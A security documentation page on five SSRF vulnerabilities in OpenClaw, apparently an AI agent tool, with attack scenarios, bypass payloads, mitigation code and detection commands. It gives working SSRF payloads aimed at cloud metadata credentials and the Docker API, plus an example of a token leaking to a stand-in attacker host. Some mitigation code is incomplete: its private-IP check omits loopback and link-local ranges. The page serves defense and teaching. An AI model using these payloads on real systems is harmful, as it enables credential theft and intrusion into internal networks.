# Server-Side Request Forgery (SSRF)

## Overview

Server-Side Request Forgery (SSRF) vulnerabilities allow attackers to make the server perform unintended HTTP requests to internal or external resources. In OpenClaw, SSRF vulnerabilities have been discovered in fetch-guard bypass, DNS pinning loss, redirect handling, and URL validation weaknesses.

**Impact**: Access to internal services (AWS metadata, databases), credential theft, lateral movement, and information disclosure.

## Vulnerability List

### High Severity

| Advisory | CVE | Summary | Fixed In |
|----------|-----|---------|----------|
| [GHSA-jrvc-8ff5-2f9f](https://github.com/openclaw/openclaw/security/advisories/GHSA-jrvc-8ff5-2f9f) | — | SSRF guard bypass via IPv4-mapped IPv6 | v2026.2.14 |
| [GHSA-6mgf-v5j7-45cr](https://github.com/openclaw/openclaw/security/advisories/GHSA-6mgf-v5j7-45cr) | — | fetch-guard forwards custom authorization headers across cross-origin redirects | v2026.3.7 |
| [GHSA-8mvx-p2r9-r375](https://github.com/openclaw/openclaw/security/advisories/GHSA-8mvx-p2r9-r375) | — | web tools strict URL guard could lose DNS pinning when env proxy is configured | v2026.3.2 |
| [GHSA-2858-xg23-26fp](https://github.com/openclaw/openclaw/security/advisories/GHSA-2858-xg23-26fp) | — | Node camera URL payload host-binding bypass allowed gateway fetch pivots | v2026.3.2 |

### Medium Severity

| Advisory | CVE | Summary | Fixed In |
|----------|-----|---------|----------|
| [GHSA-g99v-8hwm-g76g](https://github.com/openclaw/openclaw/security/advisories/GHSA-g99v-8hwm-g76g) | — | web_search citation redirect SSRF via private-network-allowing policy | v2026.3.1 |

**Total**: 5 advisories (4 high, 1 medium)

## Attack Scenarios

### 1. IPv4-Mapped IPv6 Bypass (GHSA-jrvc-8ff5-2f9f)

**Attack Vector**: Bypass SSRF protection by encoding IPv4 addresses as IPv6 IPv4-mapped addresses (e.g., `::ffff:127.0.0.1`).

**Example**:
```
Normal request (blocked):
http://127.0.0.1/admin

IPv4-mapped IPv6 (bypasses guard):
http://[::ffff:127.0.0.1]/admin
http://[::ffff:169.254.169.254]/latest/meta-data/
```

**Target Resources**:
- AWS EC2 metadata: `http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/`
- Internal services: `http://[::ffff:127.0.0.1]:8080/admin`
- Docker API: `http://[::ffff:172.17.0.1]:2375/containers/json`

**Impact**:
- AWS credentials theft
- Internal API access
- Container enumeration

### 2. Authorization Header Leak via Redirect (GHSA-6mgf-v5j7-45cr)

**Attack Vector**: Exploit fetch-guard's handling of cross-origin redirects to leak custom authorization headers to attacker-controlled servers.

**Example**:
```
1. Attacker hosts redirect at evil.com:
   HTTP/1.1 302 Found
   Location: https://attacker.com/steal

2. OpenClaw makes request with credentials:
   GET https://evil.com/api
   Authorization: Bearer secret_token

3. fetch-guard follows redirect, leaking header:
   GET https://attacker.com/steal
   Authorization: Bearer secret_token  # ← Leaked!
```

**Impact**:
- API key theft
- OAuth token leakage
- Gateway credentials exposure

### 3. DNS Pinning Loss via Proxy (GHSA-8mvx-p2r9-r375)

**Attack Vector**: When an HTTP proxy is configured via environment variables (`HTTP_PROXY`, `HTTPS_PROXY`), DNS pinning protection is bypassed, allowing TOCTOU attacks.

**Example**:
```
# Environment with proxy
export HTTP_PROXY=http://proxy.example.com:8080

# OpenClaw validates URL
1. DNS resolution: example.com → 93.184.216.34 (public IP) ✓
2. Validation passes

# DNS rebinding attack
3. Attacker changes DNS: example.com → 127.0.0.1
4. Request goes through proxy, DNS re-resolved
5. Proxy fetches http://127.0.0.1/ (internal resource)
```

**Impact**:
- Internal network access
- Localhost service exploitation
- Bypass of IP allowlists

### 4. Node Camera URL Host-Binding Bypass (GHSA-2858-xg23-26fp)

**Attack Vector**: Exploit camera URL host-binding validation to perform gateway fetch pivots.

**Example**:
```javascript
// Camera URL with permissive binding
{
  "cameraUrl": "http://0.0.0.0:8080/stream"
}

// Gateway fetch pivots to internal services
// Attacker can access any service on the same host
```

**Impact**:
- Internal service enumeration
- Gateway fetch abuse
- Credential harvesting

### 5. web_search Citation Redirect SSRF (GHSA-g99v-8hwm-g76g)

**Attack Vector**: Abuse web_search citation redirect handling with private-network-allowing policy to access internal resources.

**Example**:
```
1. Attacker crafts malicious web_search citation:
   {
     "url": "https://evil.com/redirect",
     "title": "Legitimate Article"
   }

2. evil.com returns redirect to internal resource:
   HTTP/1.1 302 Found
   Location: http://192.168.1.100/admin

3. web_search follows redirect (private network allowed)
4. Internal resource content is fetched and exposed
```

**Impact**:
- Internal documentation leakage
- Database access via HTTP APIs
- Cloud metadata exposure

## Common SSRF Bypass Techniques

### URL Encoding and Obfuscation

```
# Decimal IP encoding
http://2130706433/  (127.0.0.1 in decimal)

# Hex IP encoding
http://0x7f000001/  (127.0.0.1 in hex)

# Octal IP encoding
http://0177.0.0.1/  (127.0.0.1 in octal)

# Mixed encoding
http://127.0.0.1.nip.io/  (DNS wildcard service)

# URL shorteners
http://bit.ly/internal-redirect
```

### DNS Rebinding

```
1. Initial request: evil.com → public IP (passes validation)
2. TTL expires
3. Second request: evil.com → 127.0.0.1 (SSRF achieved)
```

### HTTP Redirect Chains

```
https://legitimate.com/
  → https://attacker.com/
    → http://169.254.169.254/latest/meta-data/
```

## Mitigation

### 1. Strict URL Validation

**Implement Multi-Layer Validation**:
```javascript
function validateURL(url) {
  const parsed = new URL(url);

  // 1. Protocol allowlist
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Invalid protocol');
  }

  // 2. Hostname blocklist
  const blockedHosts = [
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '169.254.169.254', // AWS metadata
    '::1',
    '::ffff:127.0.0.1'
  ];

  if (blockedHosts.includes(parsed.hostname)) {
    throw new Error('Blocked hostname');
  }

  // 3. Private IP range check
  if (isPrivateIP(parsed.hostname)) {
    throw new Error('Private IP not allowed');
  }

  return parsed;
}

function isPrivateIP(hostname) {
  // Check for IPv4 private ranges
  const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
  if (ipv4Regex.test(hostname)) {
    const parts = hostname.split('.').map(Number);
    // 10.0.0.0/8
    if (parts[0] === 10) return true;
    // 172.16.0.0/12
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    // 192.168.0.0/16
    if (parts[0] === 192 && parts[1] === 168) return true;
  }

  // Check for IPv6 private ranges and IPv4-mapped addresses
  if (hostname.includes(':')) {
    // Reject all IPv6 for simplicity (or implement full RFC4193 check)
    return true;
  }

  return false;
}
```

### 2. DNS Pinning

**Lock DNS Resolution**:
```javascript
const dns = require('dns').promises;

async function fetchWithDNSPinning(url) {
  const parsed = new URL(url);

  // 1. Resolve hostname
  const addresses = await dns.resolve4(parsed.hostname);
  const ip = addresses[0];

  // 2. Validate resolved IP
  if (isPrivateIP(ip)) {
    throw new Error('Resolved to private IP');
  }

  // 3. Make request using resolved IP
  const pinnedURL = url.replace(parsed.hostname, ip);

  return fetch(pinnedURL, {
    headers: {
      'Host': parsed.hostname // Preserve original Host header
    }
  });
}
```

### 3. Disable Redirects or Validate Redirect Targets

**Option 1: Disable Redirects**:
```javascript
fetch(url, {
  redirect: 'manual' // Don't follow redirects
});
```

**Option 2: Validate Each Redirect**:
```javascript
async function fetchWithRedirectValidation(url, maxRedirects = 3) {
  let currentURL = url;
  let redirectCount = 0;

  while (redirectCount < maxRedirects) {
    validateURL(currentURL); // Validate every URL in chain

    const response = await fetch(currentURL, { redirect: 'manual' });

    if (response.status >= 300 && response.status < 400) {
      currentURL = response.headers.get('Location');
      redirectCount++;
    } else {
      return response;
    }
  }

  throw new Error('Too many redirects');
}
```

### 4. Strip Sensitive Headers on Cross-Origin Requests

```javascript
function sanitizeHeaders(headers, targetOrigin, originalOrigin) {
  if (targetOrigin !== originalOrigin) {
    // Remove sensitive headers on cross-origin requests
    delete headers['Authorization'];
    delete headers['Cookie'];
    delete headers['X-API-Key'];
  }
  return headers;
}
```

### 5. Network-Level Restrictions

**Firewall Rules** (iptables example):
```bash
# Block access to AWS metadata
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block private IP ranges
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
```

**Network Segmentation**:
- Run OpenClaw in isolated network segment
- Use VPC endpoints for cloud services (no metadata access)
- Implement egress filtering

### 6. Proxy Configuration Hardening

**Disable Proxy for Internal Requests**:
```javascript
const { HttpProxyAgent } = require('http-proxy-agent');

function getAgent(url) {
  const parsed = new URL(url);

  // Don't use proxy for internal IPs
  if (isPrivateIP(parsed.hostname)) {
    return undefined; // No proxy
  }

  return new HttpProxyAgent(process.env.HTTP_PROXY);
}

fetch(url, { agent: getAgent(url) });
```

### 7. OpenClaw Runtime Checks

Enable SSRF protection runtime checks:

```bash
# Enable fetch-guard strict mode
openclaw --runtime-check ssrf-guard-strict

# Enable DNS pinning
openclaw --runtime-check dns-pinning

# Disable private network access
openclaw --runtime-check block-private-networks
```

See [Hardening Guide](../best-practices/hardening-guide.md) for comprehensive SSRF protection configuration.

## Detection

### Request Monitoring

```bash
# Monitor for internal IP access attempts
grep -E '(127\.0\.0\.1|169\.254\.|192\.168\.|10\.)' /var/log/openclaw/fetch.log

# Monitor for IPv6 encoded IPs
grep -E '\[::ffff:' /var/log/openclaw/fetch.log

# Check for redirect chains
grep "redirect" /var/log/openclaw/fetch.log | wc -l
```

### Anomaly Detection

- Unexpected outbound connections to internal IPs
- High volume of HTTP redirects
- Requests to cloud metadata endpoints
- Authorization header leaks in logs

## Related Resources

- **Vulnerability Documentation**:
  - [RCE Vulnerabilities](./rce.md) - SSRF often leads to RCE
  - [Command Injection](./command-injection.md) - Related attack vectors
- **Testing**: Test cases available in `tests/agent-hijack/` directory (Test 9)
- **Best Practices**:
  - [Hardening Guide - Network Security](../best-practices/hardening-guide.md)
- **Test Guide**: [Agent Hijack Testing Guide](../test-cases/agent-hijack-guide.md)

## References

- **CWE-918**: Server-Side Request Forgery (SSRF)
- **CWE-441**: Unintended Proxy or Intermediary ('Confused Deputy')
- **OWASP**: [Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- **PortSwigger**: [SSRF Attacks](https://portswigger.net/web-security/ssrf)
- **AWS**: [IMDSv2 - Protecting Against SSRF](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
